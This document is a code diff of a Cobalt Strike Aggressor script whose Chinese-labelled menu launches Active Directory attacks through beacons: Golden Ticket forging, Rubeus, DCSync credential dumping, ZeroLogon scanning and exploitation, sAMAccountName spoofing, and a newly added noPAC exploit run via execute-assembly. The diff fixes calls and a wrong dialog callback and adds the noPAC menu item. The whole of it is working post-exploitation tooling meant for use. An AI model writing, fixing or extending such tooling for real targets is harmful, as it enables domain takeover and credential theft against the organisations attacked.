@@ -1,20 +1,23 @@
 sub GoldenTicket{
-	bpowerpick!($3['bid'],"Invoke-GoldenTicket $3['hashs']");
+	bpowerpick($bid,"Invoke-GoldenTicket $3['hashs']");
 }
 sub Rubeus{
-	bpowerpick!($3['bid'],"Invoke-Rubeus $3['command']");
+	bpowerpick($bid,"Invoke-Rubeus $3['command']");
 }
 sub DCSync{
-	bpowerpick!($3['bid'],"Invoke-DCSync $3['command']");
+	bpowerpick($bid,"Invoke-DCSync $3['command']");
 }
 sub ZeroLogon{
 	bpowershell_import($bid, script_resource("bin/ZeroLogon.ps1"));
 	if($3["Scan"] eq 'true'){
-		bpowerpick!($3['bid'],"Invoke-Zerologon $3['fqdn'] 0");
+		bpowerpick($bid,"Invoke-Zerologon $3['fqdn'] 0");
 	} else {
-		bpowerpick!($3['bid'],"Invoke-Zerologon $3['fqdn'] 1");
+		bpowerpick($bid,"Invoke-Zerologon $3['fqdn'] 1");
 	}
 	
+}
+sub noPAC{
+	bexecute_assembly($bid, script_resource("bin/noPac.exe"), "$3['command']");
 }
 menu "域"{
 	include(script_resource("modules/powerview.cna"));
@@ -22,7 +25,7 @@ menu "域"{
 		item "加载sAMSpooofing"{
 			$bid = $1;
 			bpowershell_import($bid, script_resource("bin/sAMSpoofing.ps1"));
-			bpowerpick!($bid,"Invoke-sAMSpooofing");
+			bpowerpick($bid,"Invoke-sAMSpooofing");
 		}
 		item "GoldenTicket"{
 			$bid = $1;
@@ -34,7 +37,7 @@ menu "域"{
 		}
 		item "Invoke-GoldenTips"{
 			$bid = $1;
-			bpowerpick!($bid,"Invoke-GoldenTips");
+			bpowerpick($bid,"Invoke-GoldenTips");
 		}
 		item "Invoke-Rubeus"{
 			$bid = $1;
@@ -56,10 +59,18 @@ menu "域"{
 	}
 	item "ZeroLogon"{
 		$bid = $1;
-		$dialog = dialog("ZeroLogon", %(fqdn => "",bid => $bid), &DCSync);
+		$dialog = dialog("ZeroLogon", %(fqdn => "",bid => $bid), &ZeroLogon);
         dialog_description($dialog, "ZeroLogon");
         drow_text_big($dialog,"fqdn","FQDN:");
         drow_checkbox($dialog, "Scan","仅扫描?" , "Scan");
+        dbutton_action($dialog, "Send");
+        dialog_show($dialog);
+	}
+	item "noPAC"{
+		$bid = $1;
+		$dialog = dialog("noPAC", %(command => "",bid => $bid), &noPAC);
+        dialog_description($dialog, "https://github.com/cube0x0/noPac");
+        drow_text_big($dialog,"command","Command:");
         dbutton_action($dialog, "Send");
         dialog_show($dialog);
 	}
